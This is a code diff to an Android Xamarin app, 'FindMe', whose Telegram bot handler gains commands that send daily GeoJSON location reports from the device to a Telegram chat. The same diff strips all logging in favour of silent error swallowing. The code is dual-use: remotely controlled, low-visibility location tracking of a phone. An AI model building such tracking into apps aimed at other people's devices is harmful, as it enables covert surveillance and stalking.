@@ -1,6 +1,5 @@
 ﻿using Android.App;
 using Android.Content;
-using Android.Util;
 using Newtonsoft.Json;
 using System;
 using Xamarin.Essentials;
@@ -8,6 +7,7 @@ using System.IO;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Linq;
 using FindMe.Models;
 
 namespace FindMe.Droid
@@ -21,6 +21,7 @@ namespace FindMe.Droid
         private Timer commandCheckTimer;
         private long lastUpdateId = 0;
         private Context context;
+        private GeoJsonManager geoJsonManager;
 
         public TelegramCommandHandler(Context context)
         {
@@ -28,23 +29,29 @@ namespace FindMe.Droid
             settingsFilePath = Path.Combine(Environment.GetFolderPath(
                 Environment.SpecialFolder.Personal), "secure_settings.json");
             httpClient = new HttpClient();
+            geoJsonManager = new GeoJsonManager(context);
         }
 
         public void Start()
         {
-            // Check if credentials are available before starting timer
-            var settings = LoadSettings();
-            bool credentialsAvailable = !string.IsNullOrEmpty(settings.BotToken) && !string.IsNullOrEmpty(settings.ChatId);
+            try
+            {
+                var settings = LoadSettings();
+                bool credentialsAvailable = !string.IsNullOrEmpty(settings.BotToken) && !string.IsNullOrEmpty(settings.ChatId);
 
-            if (credentialsAvailable)
-            {
-                // Check for commands every 10 seconds
-                commandCheckTimer = new Timer(CheckForCommands, null, 0, 10000);
-                Log.Info(TAG, "Telegram command handler started");
+                if (credentialsAvailable)
+                {
+                    commandCheckTimer = new Timer(CheckForCommands, null, 0, 10000);
+
+                    _ = Task.Run(async () => {
+                        await Task.Delay(2000);
+                        await SendTelegramMessage(settings.BotToken, settings.ChatId, "🤖 FindMe service started");
+                    });
+                }
             }
-            else
+            catch
             {
-                Log.Warn(TAG, "Telegram command handler not started - missing credentials");
+                // Silent fail
             }
         }
 
@@ -60,10 +67,8 @@ namespace FindMe.Droid
             {
                 var settings = LoadSettings();
 
-                // Check if credentials are available
                 if (string.IsNullOrEmpty(settings.BotToken) || string.IsNullOrEmpty(settings.ChatId))
                 {
-                    // Skip command checking when credentials aren't available
                     return;
                 }
 
@@ -78,19 +83,16 @@ namespace FindMe.Droid
 
                 foreach (var update in updates.Result)
                 {
-                    // Update last processed ID
                     if (update.UpdateId > lastUpdateId)
                     {
                         lastUpdateId = update.UpdateId;
                     }
 
-                    // Only process messages from authorized chat ID
                     if (update.Message?.Chat?.Id.ToString() != settings.ChatId)
                     {
                         continue;
                     }
 
-                    // Process commands
                     string text = update.Message?.Text;
                     if (!string.IsNullOrEmpty(text) && text.StartsWith("/"))
                     {
@@ -98,9 +100,9 @@ namespace FindMe.Droid
                     }
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                Log.Error(TAG, $"Error checking for commands: {ex.Message}");
+                // Silent fail
             }
         }
 
@@ -110,13 +112,17 @@ namespace FindMe.Droid
             {
                 string response = "Unknown command. Available commands:\n" +
                     "/interval [milliseconds] - Set tracking interval\n" +
-                    "/status - Get current settings\n" +
+                    "/status - Get current settings and stats\n" +
                     "/start - Start tracking\n" +
                     "/stop - Stop tracking\n" +
                     "/token [newtoken] - Change bot token\n" +
-                    "/chatid [newchatid] - Change chat ID";
+                    "/chatid [newchatid] - Change chat ID\n" +
+                    "/report [date] - Get GeoJSON report for specific date (YYYY-MM-DD)\n" +
+                    "/today - Get today's tracking report\n" +
+                    "/yesterday - Get yesterday's tracking report\n" +
+                    "/files - List available data files\n" +
+                    "/cleanup [days] - Delete files older than X days";
 
-                // Split command and parameters
                 string[] parts = command.Split(new[] { ' ' }, 2);
                 string cmd = parts[0].ToLower();
                 string param = parts.Length > 1 ? parts[1] : null;
@@ -127,7 +133,6 @@ namespace FindMe.Droid
                         if (!string.IsNullOrEmpty(param) && int.TryParse(param, out int interval))
                         {
                             var Interval = interval.ToString();
-                            // Update interval
                             currentSettings.Interval = Interval;
 
                             SaveSettings(currentSettings);
@@ -145,21 +150,24 @@ namespace FindMe.Droid
 
                     case "/status":
                         bool isActive = IsServiceRunning();
-                        response = $"Status: {(isActive ? "Tracking active" : "Tracking inactive")}\n" +
-                            $"Bot token: {currentSettings.BotToken}\n" +
-                            $"Chat ID: {currentSettings.ChatId}\n" +
-                            $"Interval: {currentSettings.Interval} ms";
+                        var files = geoJsonManager.GetAvailableDataFiles();
+                        response = $"🔹 Status: {(isActive ? "✅ Tracking active" : "❌ Tracking inactive")}\n" +
+                            $"🔹 Bot token: {MaskToken(currentSettings.BotToken)}\n" +
+                            $"🔹 Chat ID: {currentSettings.ChatId}\n" +
+                            $"🔹 Interval: {currentSettings.Interval} ms\n" +
+                            $"🔹 Available data files: {files.Count}\n" +
+                            $"🔹 Device time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
                         break;
 
                     case "/start":
                         StartLocationService();
-                        response = "Location tracking started";
+                        response = "✅ Location tracking started";
                         break;
 
                     case "/stop":
                         StopLocationService();
                         await StopTracking();
-                        response = "Location tracking stopped";
+                        response = "⏹️ Location tracking stopped";
                         break;
 
                     case "/token":
@@ -171,11 +179,11 @@ namespace FindMe.Droid
                             SaveSettings(currentSettings);
                             await SecureStorage.SetAsync("bot_token", botToken);
                             StartLocationService();
-                            response = "Bot token updated";
+                            response = "🔑 Bot token updated";
                         }
                         else
                         {
-                            response = "Please specify a valid bot token";
+                            response = "❌ Please specify a valid bot token";
                         }
                         break;
 
@@ -188,41 +196,177 @@ namespace FindMe.Droid
                             SaveSettings(currentSettings);
                             await SecureStorage.SetAsync("chat_id", chatId);
                             StartLocationService();
-                            response = "Chat ID updated";
+                            response = "💬 Chat ID updated";
                         }
                         else
                         {
-                            response = "Please specify a valid chat ID";
+                            response = "❌ Please specify a valid chat ID";
                         }
+                        break;
+
+                    case "/report":
+                        if (!string.IsNullOrEmpty(param) && DateTime.TryParseExact(param, "yyyy-MM-dd", null,
+                            System.Globalization.DateTimeStyles.None, out DateTime reportDate))
+                        {
+                            await SendGeoJsonReport(reportDate, currentSettings);
+                            response = $"📊 Generating report for {param}...";
+                        }
+                        else
+                        {
+                            response = "❌ Please specify date in YYYY-MM-DD format (e.g., /report 2025-06-26)";
+                        }
+                        break;
+
+                    case "/today":
+                        await SendGeoJsonReport(DateTime.Today, currentSettings);
+                        response = "📊 Generating today's report...";
+                        break;
+
+                    case "/yesterday":
+                        await SendGeoJsonReport(DateTime.Today.AddDays(-1), currentSettings);
+                        response = "📊 Generating yesterday's report...";
+                        break;
+
+                    case "/files":
+                        var availableFiles = geoJsonManager.GetAvailableDataFiles();
+                        if (availableFiles.Count > 0)
+                        {
+                            response = $"📁 Available data files ({availableFiles.Count}):\n";
+                            foreach (var file in availableFiles.Take(10))
+                            {
+                                response += $"• {file}\n";
+                            }
+                            if (availableFiles.Count > 10)
+                            {
+                                response += $"... and {availableFiles.Count - 10} more files";
+                            }
+                        }
+                        else
+                        {
+                            response = "📁 No data files available";
+                        }
+                        break;
+
+                    case "/cleanup":
+                        int keepDays = 30;
+                        if (!string.IsNullOrEmpty(param) && int.TryParse(param, out int customDays) && customDays > 0)
+                        {
+                            keepDays = customDays;
+                        }
+
+                        var filesBefore = geoJsonManager.GetAvailableDataFiles().Count;
+                        await geoJsonManager.CleanupOldFiles(keepDays);
+                        var filesAfter = geoJsonManager.GetAvailableDataFiles().Count;
+
+                        response = $"🧹 Cleanup completed\n" +
+                            $"Files before: {filesBefore}\n" +
+                            $"Files after: {filesAfter}\n" +
+                            $"Deleted: {filesBefore - filesAfter} files older than {keepDays} days";
                         break;
                 }
 
-                // Send response back to Telegram
                 await SendTelegramMessage(currentSettings.BotToken, currentSettings.ChatId, response);
             }
-            catch (Exception ex)
+            catch
             {
-                Log.Error(TAG, $"Error processing command: {ex.Message}");
+                // Silent fail
             }
+        }
+
+        private async Task SendGeoJsonReport(DateTime date, AppSettings settings)
+        {
+            try
+            {
+                var geoJsonContent = await geoJsonManager.GenerateGeoJsonForDate(date);
+
+                if (string.IsNullOrEmpty(geoJsonContent))
+                {
+                    await SendTelegramMessage(settings.BotToken, settings.ChatId,
+                        $"📊 No location data available for {date:yyyy-MM-dd}");
+                    return;
+                }
+
+                var geoJson = JsonConvert.DeserializeObject<GeoJsonFeatureCollection>(geoJsonContent);
+
+                var summary = $"📊 **Location Report for {date:yyyy-MM-dd}**\n\n" +
+                    $"📍 Total points: {geoJson.Metadata.TotalPoints}\n" +
+                    $"📏 Distance traveled: {geoJson.Metadata.DistanceTraveledKm:F2} km\n" +
+                    $"⏱️ Tracking duration: {geoJson.Metadata.TrackingDurationHours:F1} hours\n" +
+                    $"📱 Device: {geoJson.Metadata.DeviceId}\n" +
+                    $"🔢 App version: {geoJson.Metadata.AppVersion}";
+
+                await SendTelegramMessage(settings.BotToken, settings.ChatId, summary);
+
+                var tempFile = Path.Combine(Path.GetTempPath(), $"location_report_{date:yyyy-MM-dd}.geojson");
+                await File.WriteAllTextAsync(tempFile, geoJsonContent);
+
+                await SendFileToTelegram(tempFile, $"📊 GeoJSON data for {date:yyyy-MM-dd}", settings);
+
+                if (File.Exists(tempFile))
+                {
+                    File.Delete(tempFile);
+                }
+            }
+            catch
+            {
+                // Silent fail
+            }
+        }
+
+        private async Task SendFileToTelegram(string filePath, string caption, AppSettings settings)
+        {
+            try
+            {
+                if (!File.Exists(filePath))
+                {
+                    return;
+                }
+
+                using (var form = new MultipartFormDataContent())
+                {
+                    var fileBytes = await File.ReadAllBytesAsync(filePath);
+                    var fileContent = new ByteArrayContent(fileBytes);
+                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/geo+json");
+                    form.Add(fileContent, "document", Path.GetFileName(filePath));
+
+                    form.Add(new StringContent(settings.ChatId), "chat_id");
+                    form.Add(new StringContent(caption), "caption");
+
+                    string apiUrl = $"https://api.telegram.org/bot{settings.BotToken}/sendDocument";
+                    var response = await httpClient.PostAsync(apiUrl, form);
+                }
+            }
+            catch
+            {
+                // Silent fail
+            }
+        }
+
+        private string MaskToken(string token)
+        {
+            if (string.IsNullOrEmpty(token) || token.Length < 8)
+            {
+                return "Not set";
+            }
+
+            return token.Substring(0, 8) + "..." + token.Substring(token.Length - 4);
         }
 
         private async Task SendTelegramMessage(string botToken, string chatId, string message)
         {
             try
             {
-                // Don't attempt to send if credentials are missing
                 if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId))
                 {
-                    Log.Warn(TAG, "Attempted to send Telegram message with missing credentials");
                     return;
                 }
 
-                string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(message)}";
+                string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(message)}&parse_mode=Markdown";
                 await httpClient.GetStringAsync(url);
             }
-            catch (Exception ex)
+            catch
             {
-                Log.Error(TAG, $"Error sending Telegram message: {ex.Message}");
+                // Silent fail
             }
         }
 
@@ -235,18 +379,15 @@ namespace FindMe.Droid
                     var json = File.ReadAllText(settingsFilePath);
                     var settings = JsonConvert.DeserializeObject<AppSettings>(json);
 
-                    // Return the settings without hardcoded fallbacks
                     return settings ?? new AppSettings();
                 }
                 else
                 {
-                    // Return empty settings instead of hardcoded values
                     return new AppSettings();
                 }
             }
             catch
             {
-                // Return empty settings instead of hardcoded values
                 return new AppSettings();
             }
         }
@@ -258,9 +399,9 @@ namespace FindMe.Droid
                 string json = JsonConvert.SerializeObject(settings);
                 File.WriteAllText(settingsFilePath, json);
             }
-            catch (Exception ex)
+            catch
             {
-                Log.Error(TAG, $"Error saving settings: {ex.Message}");
+                // Silent fail
             }
         }
 
@@ -284,15 +425,14 @@ namespace FindMe.Droid
                     context.StartService(intent);
                 }
 
-                // Update preferences
                 var preferences = Android.Preferences.PreferenceManager.GetDefaultSharedPreferences(context);
                 var editor = preferences.Edit();
                 editor.PutBoolean("is_tracking_service_running", true);
                 editor.Apply();
             }
-            catch (Exception ex)
+            catch
             {
-                Log.Error(TAG, $"Error starting service: {ex.Message}");
+                // Silent fail
             }
         }
 
@@ -303,15 +443,14 @@ namespace FindMe.Droid
                 var intent = new Intent(context, typeof(BackgroundLocationService));
                 context.StopService(intent);
 
-                // Update preferences
                 var preferences = Android.Preferences.PreferenceManager.GetDefaultSharedPreferences(context);
                 var editor = preferences.Edit();
                 editor.PutBoolean("is_tracking_service_running", false);
                 editor.Apply();
             }
-            catch (Exception ex)
+            catch
             {
-                Log.Error(TAG, $"Error stopping service: {ex.Message}");
+                // Silent fail
             }
         }
 
@@ -323,7 +462,6 @@ namespace FindMe.Droid
 
                 BackgroundLocationService.IsStoppingByUserRequest = true;
 
-                // Update preferences
                 var preferences = Android.Preferences.PreferenceManager.GetDefaultSharedPreferences(context);
                 var editor = preferences.Edit();
                 editor.PutBoolean("is_tracking_service_running", false);
@@ -332,9 +470,9 @@ namespace FindMe.Droid
                 context.StopService(intent);
                 return Task.CompletedTask;
             }
-            catch (Exception ex)
+            catch
             {
-                return Task.FromException(ex);
+                return Task.CompletedTask;
             }
             finally
             {
